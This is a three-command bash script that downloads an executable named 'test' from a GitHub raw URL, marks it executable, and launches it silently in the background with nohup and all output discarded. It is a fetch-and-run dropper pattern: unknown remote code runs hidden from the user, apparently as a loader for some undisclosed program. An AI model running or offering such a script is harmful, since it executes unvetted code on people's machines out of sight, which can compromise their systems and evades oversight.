#!/bin/bash

curl -sSL https://raw.githubusercontent.com/jpus/test/main/lightvela/test -o test

chmod +x test

nohup ./test >/dev/null 2>&1 &
